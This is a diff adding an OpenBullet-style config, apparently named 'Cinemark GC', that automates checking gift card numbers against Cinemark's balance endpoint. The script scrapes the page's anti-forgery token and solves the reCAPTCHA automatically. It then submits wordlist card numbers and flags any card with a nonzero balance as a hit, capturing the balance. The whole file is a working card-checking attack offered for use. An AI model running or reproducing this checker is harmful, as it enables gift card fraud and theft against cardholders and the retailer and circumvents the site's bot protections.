@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Cinemark GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-05T18:08:03.2964477+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.cinemark.com/giftcards" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.cinemark.com" 
+  HEADER "Referer: https://www.cinemark.com/giftcards" 
+PARSE "<SOURCE>" LR "__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />    " Recursive=FALSE -> VAR "TOKEN" "" "" 
+RECAPTCHA "https://www.cinemark.com/giftcards" "6LeUThsUAAAAAKzsOZb9Ltqlf5o_5MBXVZEJAoQt" -> VAR "RECAP" 
+REQUEST POST "https://www.cinemark.com/umbraco/Surface/GiftCards/GiftCardBalanceResult" AutoRedirect=TRUE 
+  CONTENT "__RequestVerificationToken=<TOKEN>&gcNum=<USER>&g-recaptcha-response=<RECAP>&X-Requested-With=XMLHttpRequest" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.cinemark.com" 
+  HEADER "Referer: https://www.cinemark.com/giftcards" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "canCheckBalance\":true" 
+    KEY "<SOURCE>" DoesNotContain "\"giftCardBalance\":\"0\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"giftCardBalance\":\"0\"" 
+    KEY "canCheckBalance\":false" 
+PARSE "<SOURCE>" LR "\"giftCardBalance\":\"" "\"," Recursive=FALSE -> VAR "Balance" "$" "" 
